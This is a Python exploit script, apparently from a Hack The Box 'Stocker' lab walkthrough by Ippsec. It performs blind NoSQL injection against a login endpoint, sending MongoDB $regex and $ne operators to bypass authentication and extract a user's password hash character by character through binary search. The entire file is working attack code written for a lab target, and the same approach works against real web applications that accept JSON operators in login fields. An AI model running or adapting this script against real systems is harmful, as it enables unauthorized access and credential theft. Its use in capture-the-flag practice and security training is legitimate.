#!/usr/bin/env python3
# The creation of this script was done in: https://www.youtube.com/watch?v=6mkZy8vZ82M
# Author: Ippsec

import requests
import string

def test_login(payload):    
    url = 'http://dev.stocker.htb/login'
    r = requests.post(url, json=payload)
    r.raise_for_status()
    if "error" in r.text:
        return False
    return True      

def get_char_password(username, startswith):
    charset = "0123456789abcdef"
    while len(charset) > 1:
        guess = charset[:len(charset)//2]
        guess = "[" + guess + "]"
        payload = {
            "username":username,
            "password":{ "$regex":f"^{startswith}{guess}" }}
        if test_login(payload):
            charset = charset[:len(charset)//2]
        else:
            charset = charset[len(charset)//2:]
    return charset
    #raise Exception("Unable to get char of username")

def get_char_username(startswith):
    charset = string.ascii_letters + string.digits
    while len(charset) > 1:
        guess = charset[:len(charset)//2]
        guess = "[" + guess + "]"
        payload = {
            "username":{ "$regex":f"^{startswith}{guess}" },
            "password":{"$ne":"admin"}}
        if test_login(payload):
            charset = charset[:len(charset)//2]
        else:
            charset = charset[len(charset)//2:]
    return charset
    #raise Exception("Unable to get char of username")

def get_password(username, length, startswith=""):
    try:
        for i in range(0, length):
            char = get_char_password(username, startswith)
            if char:
                startswith += char            
                print(startswith)
        return startswith
    except Exception as e:
        raise e

def get_username(length, startswith=""):
    try:
        for i in range(0, length):
            char = get_char_username(startswith)
            if char:
                startswith += char            
        return startswith
    except Exception as e:
        raise e

def get_length_username():
    try:
        for i in range(1,4):
            payload = {
                "username":{"$regex":f"^[a-zA-Z0-9]{{{i}}}$"},
                "password":{"$ne":"admin"}}
            if test_login(payload):
                return i
        raise Exception("Unable to get length of username")
    except Exception as e:
        raise e
    
def get_length_password():
    try:
        for i in range(1,128):
            payload = {
                "username":"angoose",
                "password":{"$regex":f"^[a-zA-Z0-9]{{{i}}}$"}}
            if test_login(payload):
                return i
        raise Exception("Unable to get length of username")
    except Exception as e:
        raise e

try:
    length_password = get_length_password()
    print("Angoose Password = 32 characters")
    pw = get_password("angoose", length_password)
    print("Angoose Password = " + pw)

    # print(length_password)
    

    #length_username = get_length_username()
    # length_username = 7
    # get_username(length_username)
except Exception as e:
    print(e)
